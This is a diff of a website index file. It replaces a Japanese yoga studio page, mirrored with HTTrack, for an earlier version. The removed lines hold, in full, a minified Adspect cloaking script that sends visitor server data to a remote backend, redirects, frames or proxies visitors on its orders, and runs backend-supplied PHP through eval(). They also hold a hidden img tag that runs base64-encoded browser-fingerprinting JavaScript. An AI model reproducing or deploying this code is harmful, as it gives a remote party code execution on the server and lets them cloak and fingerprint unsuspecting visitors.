@@ -1,16 +1,760 @@
-<?php
-ini_set('display_errors','0');error_reporting(E_ALL);if(!function_exists('adspect')){function adspect_exit($code,$message){http_response_code($code);exit($message);}function adspect_dig($array,$key,$default=''){return array_key_exists($key,$array)?$array[$key]:$default;}function adspect_resolve_path($path){if($path[0]===DIRECTORY_SEPARATOR){$path=adspect_dig($_SERVER,'DOCUMENT_ROOT',__DIR__).$path;}else{$path=__DIR__.DIRECTORY_SEPARATOR.$path;}return realpath($path);}function adspect_spoof_request($url=''){$_SERVER['REQUEST_METHOD']='GET';$_POST=[];if($url!==''){$url=parse_url($url);if(isset($url['path'])){if(substr($url['path'],0,1)==='/'){$_SERVER['REQUEST_URI']=$url['path'];}else{$_SERVER['REQUEST_URI']=dirname($_SERVER['REQUEST_URI']).'/'.$url['path'];}}if(isset($url['query'])){parse_str($url['query'],$_GET);$_SERVER['QUERY_STRING']=$url['query'];}else{$_GET=[];$_SERVER['QUERY_STRING']='';}}}function adspect_try_files(){foreach(func_get_args()as$path){if(is_file($path)){if(!is_readable($path)){adspect_exit(403,'Permission denied');}header('Content-Type: text/html');switch(strtolower(pathinfo($path,PATHINFO_EXTENSION))){case'php':case'phtml':case'php5':case'php4':case'php3':adspect_execute($path);exit;default:header('Content-Type: '.adspect_content_type($path));case'html':case'htm':header('Content-Length: '.filesize($path));readfile($path);exit;}}}adspect_exit(404,'File not found');}function adspect_execute(){global$_adspect;require_once func_get_arg(0);}function adspect_content_type($path){if(function_exists('mime_content_type')){$type=mime_content_type($path);if(is_string($type)){return$type;}}return'application/octet-stream';}function adspect_serve_local($url){$path=(string)parse_url($url,PHP_URL_PATH);if($path===''){return null;}$path=adspect_resolve_path($path);if(is_string($path)){adspect_spoof_request($url);if(is_dir($path)){chdir($path);adspect_try_files('index.php','index.html','index.htm');return;}chdir(dirname($path));adspect_try_files($path);return;}adspect_exit(404,'File not found');}function adspect_real_ip(){if(array_key_exists('HTTP_X_FORWARDED_FOR',$_SERVER)){$ip=strtok($_SERVER['HTTP_X_FORWARDED_FOR'],',');}elseif(array_key_exists('HTTP_X_REAL_IP',$_SERVER)){$ip=$_SERVER['HTTP_X_REAL_IP'];}elseif(array_key_exists('HTTP_REAL_IP',$_SERVER)){$ip=$_SERVER['HTTP_REAL_IP'];}elseif(array_key_exists('HTTP_CF_CONNECTING_IP',$_SERVER)){$ip=$_SERVER['HTTP_CF_CONNECTING_IP'];}if(empty($ip)){$ip=$_SERVER['REMOTE_ADDR'];}return$ip;}function adspect_crypt($in,$key){$il=strlen($in);$kl=strlen($key);$out='';for($i=0;$i<$il;++$i){$out.=chr(ord($in[$i])^ord($key[$i%$kl]));}return$out;}function adspect_proxy_headers(){$headers=[];foreach(func_get_args()as$key){if(array_key_exists($key,$_SERVER)){$header=strtr(strtolower(substr($key,5)),'_','-');$headers[]="{$header}: {$_SERVER[$key]}";}}return$headers;}function adspect_proxy($url,$param=null,$key=null){$url=parse_url($url);if(empty($url)){adspect_exit(500,'Invalid proxy URL');}extract($url);$curl=curl_init();curl_setopt($curl,CURLOPT_FORBID_REUSE,true);curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,60);curl_setopt($curl,CURLOPT_TIMEOUT,60);curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($curl,CURLOPT_USERAGENT,adspect_dig($_SERVER,'HTTP_USER_AGENT','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36'));curl_setopt($curl,CURLOPT_FOLLOWLOCATION,true);curl_setopt($curl,CURLOPT_RETURNTRANSFER,true);if(!isset($scheme)){$scheme='http';}if(!isset($host)){$host=adspect_dig($_SERVER,'HTTP_HOST','localhost');}if(isset($user,$pass)){curl_setopt($curl,CURLOPT_USERPWD,"$user:$pass");$host="$user:$pass@$host";}if(isset($port)){curl_setopt($curl,CURLOPT_PORT,$port);$host="$host:$port";}$origin="$scheme://$host";if(!isset($path)){$path='/';}if($path[0]!=='/'){$path="/$path";}$url=$path;if(isset($query)){$url.="?$query";}curl_setopt($curl,CURLOPT_URL,$origin.$url);$headers=adspect_proxy_headers('HTTP_ACCEPT','HTTP_ACCEPT_LANGUAGE','HTTP_COOKIE');$headers[]='Cache-Control: no-cache';curl_setopt($curl,CURLOPT_HTTPHEADER,$headers);$data=curl_exec($curl);if($errno=curl_errno($curl)){adspect_exit(500,'curl error: '.curl_strerror($errno));}$code=curl_getinfo($curl,CURLINFO_HTTP_CODE);$type=curl_getinfo($curl,CURLINFO_CONTENT_TYPE);curl_close($curl);http_response_code($code);if(is_string($data)){if(isset($param,$key)&&preg_match('{^text/(?:html|css)}i',$type)){$base=$path;if($base[-1]!=='/'){$base=dirname($base);}$base=rtrim($base,'/');$rw=function($m)use($origin,$base,$param,$key){list($repl,$what,$url)=$m;$url=htmlspecialchars_decode($url);$url=parse_url($url);if(!empty($url)){extract($url);if(isset($host)){if(!isset($scheme)){$scheme='http';}$host="$scheme://$host";if(isset($user,$pass)){$host="$user:$pass@$host";}if(isset($port)){$host="$host:$port";}}else{$host=$origin;}if(!isset($path)){$path='';}if(!strlen($path)||$path[0]!=='/'){$path="$base/$path";}if(!isset($query)){$query='';}$host=base64_encode(adspect_crypt($host,$key));parse_str($query,$query);$query[$param]="$path#$host";$repl='?'.http_build_query($query);if(isset($fragment)){$repl.="#$fragment";}$repl=htmlspecialchars($repl);if($what[-1]==='='){$repl="\"$repl\"";}$repl=$what.$repl;}return$repl;};$re='{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i';$data=preg_replace_callback($re,$rw,$data);}}else{$data='';}header("Content-Type: $type");header('Content-Length: '.strlen($data));echo$data;}function adspect($sid,$mode,$param){header('Cache-Control: no-store');if(!function_exists('curl_init')){adspect_exit(500,'php-curl extension is missing');}if(!function_exists('json_encode')||!function_exists('json_decode')){adspect_exit(500,'php-json extension is missing');}$key=hex2bin(str_replace('-','',$sid));if($key===false){adspect_exit(500,'Invalid stream ID');}$addr=adspect_real_ip();if(array_key_exists($param,$_GET)&&strpos($_GET[$param],'#')!==false){list($url,$host)=explode('#',$_GET[$param],2);$host=adspect_crypt(base64_decode($host),$key);unset($_GET[$param]);$query=http_build_query($_GET);$url="$host$url?$query";adspect_proxy($url,$param,$key);exit;}$ajax=intval($mode==='ajax');$curl=curl_init();$sid=adspect_dig($_GET,'__sid',$sid);$ua=adspect_dig($_SERVER,'HTTP_USER_AGENT');$referrer=adspect_dig($_SERVER,'HTTP_REFERER');$query=http_build_query($_GET);switch(array_key_exists('data',$_POST)){case true:$payload=json_decode($_POST['data'],true);if(is_array($payload)){break;}default:$payload=[];break;}$payload['server']=$_SERVER;curl_setopt($curl,CURLOPT_POST,true);curl_setopt($curl,CURLOPT_POSTFIELDS,json_encode($payload));if($ajax){header('Access-Control-Allow-Origin: *');$cid=adspect_dig($_SERVER,'HTTP_X_REQUEST_ID');}else{$cid=adspect_dig($_COOKIE,'_cid');}curl_setopt($curl,CURLOPT_FORBID_REUSE,true);curl_setopt($curl,CURLOPT_CONNECTTIMEOUT,60);curl_setopt($curl,CURLOPT_TIMEOUT,60);curl_setopt($curl,CURLOPT_SSL_VERIFYHOST,0);curl_setopt($curl,CURLOPT_SSL_VERIFYPEER,0);curl_setopt($curl,CURLOPT_HTTPHEADER,["X-Forwarded-Host: {$_SERVER['HTTP_HOST']}","X-Request-ID: {$cid}","Adspect-IP: {$addr}","Adspect-UA: {$ua}","Adspect-Referrer: {$referrer}",]);curl_setopt($curl,CURLOPT_URL,"https://rpc.adspect.net/v2/{$sid}?{$query}");curl_setopt($curl,CURLOPT_RETURNTRANSFER,true);$json=curl_exec($curl);if($errno=curl_errno($curl)){adspect_exit(500,'curl error: '.curl_strerror($errno));}$code=curl_getinfo($curl,CURLINFO_HTTP_CODE);curl_close($curl);if($code!==200){adspect_exit($code,'Error '.$code);}$data=json_decode($json,true);if(!is_array($data)){adspect_exit(500,'Invalid backend response');}global$_adspect;$_adspect=$data;extract($data);if($ajax){switch($action){case'php':ob_start();eval($target);$data['target']=ob_get_clean();$json=json_encode($data);break;}if($_SERVER['REQUEST_METHOD']==='POST'){header('Content-Type: application/json');echo$json;}else{header('Content-Type: application/javascript');if(!$ok&&!$js){return null;}echo"window._adata={$json};";return$target;}}else{if($js){setcookie('_cid',$cid,time()+60);return$target;}switch($action){case'local':return adspect_serve_local($target);case'noop':adspect_spoof_request($target);return null;case'301':case'302':case'303':header("Location: {$target}",true,(int)$action);break;case'xar':header("X-Accel-Redirect: {$target}");break;case'xsf':header("X-Sendfile: {$target}");break;case'refresh':header("Refresh: 0; url={$target}");adspect_spoof_request();return null;case'meta':$target=htmlspecialchars($target);echo"<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>";break;case'iframe':$target=htmlspecialchars($target);echo"<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"></head><body><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe></body></html>";break;case'proxy':adspect_proxy($target,$param,$key);break;case'fetch':adspect_proxy($target);break;case'return':if(is_numeric($target)){http_response_code((int)$target);}else{adspect_exit(500,'Non-numeric status code');}break;case'php':eval($target);break;case'js':$target=htmlspecialchars(base64_encode($target));echo"<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>";break;}}exit;}}$target=adspect('3973a4a0-955e-4dbc-903b-dc4ca5d41c80','index','_');if(!isset($target)){return;}?>
 <!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<html lang="ja">
+  
+<!-- Mirrored from seishinyoga.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 05 Feb 2025 13:12:31 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>静心ヨガセンター</title>
+    <link rel="stylesheet" href="style.css" />
+    <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
+    <!-- ==============  BOX ICON CDN ==============  -->
+    <link
+      href="../unpkg.com/boxicons%402.1.2/css/boxicons.min.css"
+      rel="stylesheet"
+    />
+    <!-- ==============  LINK SWIPER'S CSS ==============  -->
+    <link
+      rel="stylesheet"
+      href="../unpkg.com/swiper%4011.2.2/swiper-bundle.min.css"
+    />
+
+    <style>
+      /* Modal styles */
+      .modal {
+        display: none; /* Hidden by default */
+        position: fixed; /* Stay in place */
+        z-index: 1000; /* Sit on top */
+        left: 0;
+        top: 0;
+        width: 100%; /* Full width */
+        height: 100%; /* Full height */
+        overflow: auto; /* Enable scroll if needed */
+        background-color: rgba(0, 0, 0, 0.4); /* Black w/ opacity */
+      }
+
+      .modal-content {
+        position: relative;
+        margin: 5% auto; /* 5% from the top and centered */
+        padding: 20px;
+        padding-top: 70px;
+        width: 90%; /* Could be more or less, depending on screen size */
+        max-width: 500px;
+        background-color: #fff;
+        border-radius: 10px;
+        text-align: center;
+      }
+
+      .modal-image {
+        width: 100%;
+        height: auto;
+        border-radius: 10px;
+        margin-bottom: 20px;
+      }
+
+      .close-button {
+        position: absolute;
+        top: 2px;
+        right: 20px;
+        color: #aaa;
+        font-size: 50px;
+        font-weight: bold;
+        cursor: pointer;
+        z-index: 10;
+      }
+
+      .close-button:hover,
+      .close-button:focus {
+        color: black;
+        text-decoration: none;
+        cursor: pointer;
+      }
+
+      .btn-primary {
+        display: inline-block;
+        padding: 10px 20px;
+        margin-top: 10px;
+        background-color: #007bff;
+        color: #fff;
+        text-decoration: none;
+        border-radius: 5px;
+      }
+
+      .close-modal {
+        cursor: pointer;
+      }
+    </style>
+    <script type="text/javascript">
+      (function (c, l, a, r, i, t, y) {
+        c[a] =
+          c[a] ||
+          function () {
+            (c[a].q = c[a].q || []).push(arguments);
+          };
+        t = l.createElement(r);
+        t.async = 1;
+        t.src = "https://www.clarity.ms/tag/" + i;
+        y = l.getElementsByTagName(r)[0];
+        y.parentNode.insertBefore(t, y);
+      })(window, document, "clarity", "script", "nlpg0exsm0");
+    </script>
   </head>
+
   <body>
-    <div id="root">
-      <img src="/files/images/Logo.png" data-digest="KGZ1bmN0aW9uKCl7dmFyIGU9W10sYj17fTt0cnl7ZnVuY3Rpb24gYyhhKXtpZigib2JqZWN0Ij09PXR5cGVvZiBhJiZudWxsIT09YSl7dmFyIGY9e307ZnVuY3Rpb24gbihsKXt0cnl7dmFyIGs9YVtsXTtzd2l0Y2godHlwZW9mIGspe2Nhc2UgIm9iamVjdCI6aWYobnVsbD09PWspYnJlYWs7Y2FzZSAiZnVuY3Rpb24iOms9ay50b1N0cmluZygpfWZbbF09a31jYXRjaCh0KXtlLnB1c2godC5tZXNzYWdlKX19Zm9yKHZhciBkIGluIGEpbihkKTt0cnl7dmFyIGc9T2JqZWN0LmdldE93blByb3BlcnR5TmFtZXMoYSk7Zm9yKGQ9MDtkPGcubGVuZ3RoOysrZCluKGdbZF0pO2ZbIiEhIl09Z31jYXRjaChsKXtlLnB1c2gobC5tZXNzYWdlKX1yZXR1cm4gZn19Yi5zY3JlZW49Yyh3aW5kb3cuc2NyZWVuKTtiLndpbmRvdz1jKHdpbmRvdyk7Yi5uYXZpZ2F0b3I9Yyh3aW5kb3cubmF2aWdhdG9yKTtiLmxvY2F0aW9uPWMod2luZG93LmxvY2F0aW9uKTtiLmNvbnNvbGU9Yyh3aW5kb3cuY29uc29sZSk7CmIuZG9jdW1lbnRFbGVtZW50PWZ1bmN0aW9uKGEpe3RyeXt2YXIgZj17fTthPWEuYXR0cmlidXRlcztmb3IodmFyIGQgaW4gYSlkPWFbZF0sZltkLm5vZGVOYW1lXT1kLm5vZGVWYWx1ZTtyZXR1cm4gZn1jYXRjaChnKXtlLnB1c2goZy5tZXNzYWdlKX19KGRvY3VtZW50LmRvY3VtZW50RWxlbWVudCk7Yi5kb2N1bWVudD1jKGRvY3VtZW50KTt0cnl7Yi50aW1lem9uZU9mZnNldD0obmV3IERhdGUpLmdldFRpbWV6b25lT2Zmc2V0KCl9Y2F0Y2goYSl7ZS5wdXNoKGEubWVzc2FnZSl9dHJ5e2IuY2xvc3VyZT1mdW5jdGlvbigpe30udG9TdHJpbmcoKX1jYXRjaChhKXtlLnB1c2goYS5tZXNzYWdlKX10cnl7Yi5mcmFtZT13aW5kb3cuc2VsZiE9PXdpbmRvdy50b3B9Y2F0Y2goYSl7Yi5mcmFtZT0hMH10cnl7Yi50b3VjaEV2ZW50PWRvY3VtZW50LmNyZWF0ZUV2ZW50KCJUb3VjaEV2ZW50IikudG9TdHJpbmcoKX1jYXRjaChhKXtlLnB1c2goYS5tZXNzYWdlKX10cnl7dmFyIHA9ZnVuY3Rpb24oKXt9LApxPTA7cC50b1N0cmluZz1mdW5jdGlvbigpeysrcTtyZXR1cm4iIn07Y29uc29sZS5sb2cocCk7Yi50b3N0cmluZz1xfWNhdGNoKGEpe2UucHVzaChhLm1lc3NhZ2UpfXRyeXt2YXIgbT1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJjYW52YXMiKS5nZXRDb250ZXh0KCJ3ZWJnbCIpLHI9bS5nZXRFeHRlbnNpb24oIldFQkdMX2RlYnVnX3JlbmRlcmVyX2luZm8iKTtiLndlYmdsPXt2ZW5kb3I6bS5nZXRQYXJhbWV0ZXIoci5VTk1BU0tFRF9WRU5ET1JfV0VCR0wpLHJlbmRlcmVyOm0uZ2V0UGFyYW1ldGVyKHIuVU5NQVNLRURfUkVOREVSRVJfV0VCR0wpfX1jYXRjaChhKXtlLnB1c2goYS5tZXNzYWdlKX1mdW5jdGlvbiBoKGEsZixkKXt2YXIgZz1hLnByb3RvdHlwZVtmXTthLnByb3RvdHlwZVtmXT1mdW5jdGlvbigpe2IucHJvdG89ITB9O2QoKTthLnByb3RvdHlwZVtmXT1nfXRyeXtoKEFycmF5LCJpbmNsdWRlcyIsZnVuY3Rpb24oKXtyZXR1cm4gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgidmlkZW8iKS5jYW5QbGF5VHlwZSgidmlkZW8vbXA0Iil9KX1jYXRjaChhKXt9fWNhdGNoKGMpe2UucHVzaChjLm1lc3NhZ2UpfShmdW5jdGlvbigpe2IuZXJyb3JzPQplO3ZhciBjPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImZvcm0iKSxoPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImlucHV0Iik7Yy5tZXRob2Q9IlBPU1QiO2MuYWN0aW9uPXdpbmRvdy5sb2NhdGlvbi5ocmVmO2gudHlwZT0iaGlkZGVuIjtoLm5hbWU9ImRhdGEiO2gudmFsdWU9SlNPTi5zdHJpbmdpZnkoYik7Yy5hcHBlbmRDaGlsZChoKTtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGMpO2Muc3VibWl0KCl9KSgpfSkoKTsK" onerror="(new Function(atob(this.dataset.digest)))();" style="visibility: hidden;">
+    <nav>
+      <div class="container">
+        <a href="#" class="nav_logo">
+          <h3>静心ヨガセンター</h3>
+        </a>
+
+        <ul id="nav_items" class="nav-links">
+          <li><a href="#">ホーム</a></li>
+          <li><a href="#services">私たちのアプローチ</a></li>
+          <li><a href="#instructors">インストラクター</a></li>
+          <li><a href="#testimonials">お客様の声</a></li>
+          <li><a href="#bookplace" class="btn">予約する</a></li>
+        </ul>
+
+        <button id="open_nav-btn"><i class="bx bx-menu"></i></button>
+        <button id="close_nav-btn"><i class="bx bx-x"></i></button>
+      </div>
+    </nav>
+    <!-- ==============  END OF NAV ==============  -->
+
+    <header>
+      <img
+        src="assets/yogaclass.jpg"
+        alt="静心ヨガセンターのヨガクラスの写真"
+      />
+    </header>
+    <!-- ==============  END OF HEADER ==============  -->
+
+    <section id="services">
+      <h2>私たちのアプローチ</h2>
+      <p>
+        すべての人がバランス、強さ、そして平和を見つけることができる、歓迎するヨガの聖域。
+      </p>
+
+      <div class="container">
+        <article>
+          <i class="bx bxs-yin-yang"></i>
+          <div>
+            <h4>ウェルビーイング</h4>
+            <small
+              >身体と心の健康を育むための包括的なサービスを提供し、個別のサポート、ガイダンス、リソースを通じてウェルビーイングを向上させます。</small
+            >
+          </div>
+        </article>
+
+        <article>
+          <i class="bx bx-donate-blood"></i>
+          <div>
+            <h4>健康</h4>
+            <small
+              >健康サービスはあなたの健康を最優先し、専門的なケア、革新的なソリューション、ホリスティックなアプローチを提供して活力を確保します。</small
+            >
+          </div>
+        </article>
+        <article>
+          <i class="bx bx-heart"></i>
+          <div>
+            <h4>サポート</h4>
+            <small
+              >ヨガサポートサービスの力を受け入れ、ガイダンス、励まし、そして実践を深めるための支援的なコミュニティを提供します。</small
+            >
+          </div>
+        </article>
+        <article>
+          <i class="bx bx-donate-heart"></i>
+          <div>
+            <h4>コミュニティ</h4>
+            <small
+              >同じ志を持つ人々が集まり、実践とサポートを通じてつながりと成長を促進する活気に満ちたヨガコミュニティサービスに参加してください。</small
+            >
+          </div>
+        </article>
+        <article>
+          <i class="bx bx-happy-heart-eyes"></i>
+          <div>
+            <h4>インスピレーション</h4>
+            <small
+              >ヨガに触発されたインスピレーションサービスで内なる火を燃やし、創造性、動機づけ、そしてマインドフルネスをあなたの変革の旅に提供します。</small
+            >
+          </div>
+        </article>
+        <article>
+          <i class="bx bx-handicap"></i>
+          <div>
+            <h4>インクルーシブ</h4>
+            <small
+              >多様性を受け入れ、すべての実践者に安全で歓迎される空間を提供するヨガサービスを通じて、包摂性の力を体験してください。</small
+            >
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <section>
+      <h2>私たちの得意分野</h2>
+      <p>心と体のバランスを見つける、すべての人を歓迎するヨガの聖域。</p>
+
+      <div class="container">
+        <article>
+          <i class="bx bxs-yin-yang"></i>
+          <div>
+            <h4>心身の健康</h4>
+            <small>ヨガで心身の健康を高めましょう。</small>
+          </div>
+        </article>
+
+        <article>
+          <i class="bx bx-donate-blood"></i>
+          <div>
+            <h4>健康維持</h4>
+            <small>ホリスティックなアプローチで健康維持。</small>
+          </div>
+        </article>
+
+        <article>
+          <i class="bx bx-heart"></i>
+          <div>
+            <h4>個別サポート</h4>
+            <small>専門ガイドによる個別サポート。</small>
+          </div>
+        </article>
+
+        <article>
+          <i class="bx bx-donate-heart"></i>
+          <div>
+            <h4>コミュニティ</h4>
+            <small>つながりと成長を促進するヨガコミュニティ。</small>
+          </div>
+        </article>
+
+        <article>
+          <i class="bx bx-happy-heart-eyes"></i>
+          <div>
+            <h4>インスピレーション</h4>
+            <small>ヨガで創造性と動機づけを高める。</small>
+          </div>
+        </article>
+
+        <article>
+          <i class="bx bx-handicap"></i>
+          <div>
+            <h4>多様性の力</h4>
+            <small>すべての人に歓迎されるインクルーシブな空間。</small>
+          </div>
+        </article>
+      </div>
+    </section>
+
+    <!-- ==============  END OF SERVICES ==============  -->
+
+    <section id="instructors">
+      <h2>インストラクター</h2>
+      <p>
+        経験豊富なヨガインストラクターの献身的なチームが、専門知識、情熱、そして育成の精神をもってあなたの変革の旅を導きます。
+      </p>
+      <div class="container">
+        <article>
+          <div class="instructors_image">
+            <img src="assets/instructor1.jpg" alt="インストラクター1" />
+          </div>
+          <div class="instructor_details">
+            <h4>アンナ・ペッケル</h4>
+            <small>ピラティス＆禅インストラクター</small>
+          </div>
+          <a
+            href="https://instagram.com/"
+            class="instructor_instagram"
+            target="_blank"
+            ><i class="bx bxl-instagram"></i
+          ></a>
+        </article>
+
+        <article>
+          <div class="instructors_image">
+            <img src="assets/instructor2.jpg" alt="インストラクター2" />
+          </div>
+          <div class="instructor_details">
+            <h4>デイン・アンカー</h4>
+            <small>ヴィンヤサインストラクター</small>
+          </div>
+          <a
+            href="https://instagram.com/"
+            class="instructor_instagram"
+            target="_blank"
+            ><i class="bx bxl-instagram"></i
+          ></a>
+        </article>
+
+        <article>
+          <div class="instructors_image">
+            <img src="assets/instructor3.jpg" alt="インストラクター3" />
+          </div>
+          <div class="instructor_details">
+            <h4>ジャズミン・ギアヴァシス</h4>
+            <small>ヴィンヤサフローインストラクター</small>
+          </div>
+          <a
+            href="https://instagram.com/"
+            class="instructor_instagram"
+            target="_blank"
+            ><i class="bx bxl-instagram"></i
+          ></a>
+        </article>
+
+        <article>
+          <div class="instructors_image">
+            <img src="assets/instructor4.jpg" alt="インストラクター4" />
+          </div>
+          <div class="instructor_details">
+            <h4>メリエラ・テンジン</h4>
+            <small>フィットフローインストラクター</small>
+          </div>
+          <a
+            href="https://instagram.com/"
+            class="instructor_instagram"
+            target="_blank"
+            ><i class="bx bxl-instagram"></i
+          ></a>
+        </article>
+
+        <article>
+          <div class="instructors_image">
+            <img src="assets/instructor5.jpg" alt="インストラクター5" />
+          </div>
+          <div class="instructor_details">
+            <h4>ヘイリー・アイエコ</h4>
+            <small>プラナヴィンヤサインストラクター</small>
+          </div>
+          <a
+            href="https://instagram.com/"
+            class="instructor_instagram"
+            target="_blank"
+            ><i class="bx bxl-instagram"></i
+          ></a>
+        </article>
+
+        <article>
+          <div class="instructors_image">
+            <img src="assets/instructor6.jpg" alt="インストラクター6" />
+          </div>
+          <div class="instructor_details">
+            <h4>ミアン・オーウェン</h4>
+            <small>リストラティブ瞑想インストラクター</small>
+          </div>
+          <a
+            href="https://instagram.com/"
+            class="instructor_instagram"
+            target="_blank"
+            ><i class="bx bxl-instagram"></i
+          ></a>
+        </article>
+      </div>
+    </section>
+    <!-- ==============  END OF INSTRUCTORS ==============  -->
+
+    <section id="testimonials" class="swiper mySwiper">
+      <h2>お客様の声</h2>
+      <p>
+        静心ヨガセンターで人生をポジティブに変えられた人々のストーリーを発見してください。
+      </p>
+
+      <div class="swiper-wrapper">
+        <article class="swiper-slide">
+          <p>
+            このヨガスタジオは私の人生を変えました。インストラクターは素晴らしく、クラスはすべてのレベルに対応しています。誰にでも強くお勧めします！
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="assets/avatar1.jpg" alt="クライアント1" />
+            </div>
+            <div class="client_details">
+              <h5>マックスウェル・ジェームズ</h5>
+              <small>クライアント | ヴィンヤサ</small>
+            </div>
+          </div>
+        </article>
+
+        <article class="swiper-slide">
+          <p>
+            ここで私の聖域を見つけました。スピリチュアリティはこれまでになく魅力的です。サポートしてくれるコミュニティと専門的な指導に感謝します！
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="assets/avatar2.jpg" alt="クライアント2" />
+            </div>
+            <div class="client_details">
+              <h5>ニア・サリヴァン</h5>
+              <small>クライアント | リストラティブ瞑想</small>
+            </div>
+          </div>
+        </article>
+
+        <article class="swiper-slide">
+          <p>
+            比類のない体験！ホリスティックなアプローチで身体と心のバランスを見つけることができました。本当に人生が変わりました。
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="assets/avatar3.jpg" alt="クライアント3" />
+            </div>
+            <div class="client_details">
+              <h5>ロクサーヌ・ブラウン</h5>
+              <small>クライアント | フィットフロー</small>
+            </div>
+          </div>
+        </article>
+
+        <article class="swiper-slide">
+          <p>
+            この包括的な空間に感謝します。ヨガクラスは多様でインスピレーションに満ち、つながりと個人的な成長を促進します。病みつきになりました！
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="assets/avatar4.jpg" alt="クライアント4" />
+            </div>
+            <div class="client_details">
+              <h5>シャンテル・ジェフ</h5>
+              <small>クライアント | プラナヴィンヤサ</small>
+            </div>
+          </div>
+        </article>
+
+        <article class="swiper-slide">
+          <p>
+            ピラティスは私の生命線となりました。このスタジオのおかげです。インストラクターはポジティブなエネルギーを放ち、雰囲気は暖かく歓迎されます。
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="assets/avatar5.jpg" alt="クライアント5" />
+            </div>
+            <div class="client_details">
+              <h5>ジャッキー・ベル</h5>
+              <small>クライアント | ピラティス＆禅</small>
+            </div>
+          </div>
+        </article>
+
+        <article class="swiper-slide">
+          <p>
+            素晴らしいヨガサービス！私の健康とウェルビーイングは大幅に改善されました。サポートしてくれるコミュニティがあるので、続けることができます。
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="assets/avatar6.jpg" alt="クライアント6" />
+            </div>
+            <div class="client_details">
+              <h5>ゲージ・テイラー</h5>
+              <small>クライアント | ヴィンヤサ</small>
+            </div>
+          </div>
+        </article>
+
+        <article class="swiper-slide">
+          <p>
+            ヨガを通じて素晴らしい変革を遂げました。インストラクターは知識豊富で、クラスのバリエーションも豊富で、モチベーションを保つことができます。
+          </p>
+          <div class="client">
+            <div class="avatar">
+              <img src="assets/avatar7.jpg" alt="クライアント7" />
+            </div>
+            <div class="client_details">
+              <h5>ライアン・ジェームズ</h5>
+              <small>クライアント | フィットフロー</small>
+            </div>
+          </div>
+        </article>
+      </div>
+      <div class="swiper-pagination"></div>
+    </section>
+    <!-- ==============  END OF TESTIMONIALS ==============  -->
+
+    <section id="photogallery">
+      <h2>私たちの活動</h2>
+      <p>
+        私たちのダイナミックで変革的なヨガクラスとコミュニティを紹介する魅力的なフォトギャラリー。
+      </p>
+
+      <div class="container">
+        <div class="gallery">
+          <figure class="gallery__item gallery__item--1">
+            <img
+              src="assets/gallery1.jpg"
+              alt="ギャラリー画像1"
+              class="gallery__img"
+            />
+          </figure>
+          <figure class="gallery__item gallery__item--2">
+            <img
+              src="assets/gallery3.jpg"
+              alt="ギャラリー画像2"
+              class="gallery__img"
+            />
+          </figure>
+          <figure class="gallery__item gallery__item--3">
+            <img
+              src="assets/gallery4.jpg"
+              alt="ギャラリー画像3"
+              class="gallery__img"
+            />
+          </figure>
+          <figure class="gallery__item gallery__item--4">
+            <img
+              src="assets/gallery2.jpg"
+              alt="ギャラリー画像4"
+              class="gallery__img"
+            />
+          </figure>
+        </div>
+      </div>
+    </section>
+    <!-- ==============  END OF PHOTO GALLERY ==============  -->
+
+    <section id="bookplace">
+      <div class="container">
+        <div class="info">
+          <h2>予約する</h2>
+          <p>
+            私たちと一緒にヨガの旅を始める準備はできましたか？今すぐ予約して、内なる平和を発見してください。
+          </p>
+
+          <article>
+            <div class="info_icon"><i class="bx bx-user"></i></div>
+
+            <div>
+              <h4>才能あるスタッフ</h4>
+              <small
+                >私たちの献身的で才能あるスタッフは、ウェルビーイングと成長の旅を導く情熱的なチームです。</small
+              >
+            </div>
+          </article>
+
+          <article>
+            <div class="info_icon"><i class="bx bx-check-shield"></i></div>
+
+            <div>
+              <h4>質の高いレッスン</h4>
+              <small
+                >高品質のレッスンを体験し、ウェルビーイングと精神的な成長を養うために細心の注意を払って作られたヨガ教育を受けてください。</small
+              >
+            </div>
+          </article>
+
+          <article>
+            <div class="info_icon"><i class="bx bx-lock-alt"></i></div>
+
+            <div>
+              <h4>カスタマイズされたプライベートクラス</h4>
+              <small
+                >あなたの独自のニーズと目標に合わせて設計された、特別なプライベートクラスで実践を向上させ、旅を力強く進めましょう。</small
+              >
+            </div>
+          </article>
+        </div>
+
+        <form action="https://formspree.io/f/moqrlrgl" method="POST">
+          <div class="form_group">
+            <label for="name">名前</label>
+            <input
+              type="text"
+              placeholder="名前を入力してください"
+              name="Client's Name"
+              id="name"
+              required
+            />
+          </div>
+
+          <div class="form_group">
+            <label for="phone">メールアドレス</label>
+            <input
+              type="email"
+              placeholder="メールアドレスを入力してください"
+              name="Email Address"
+              id="email"
+              required
+            />
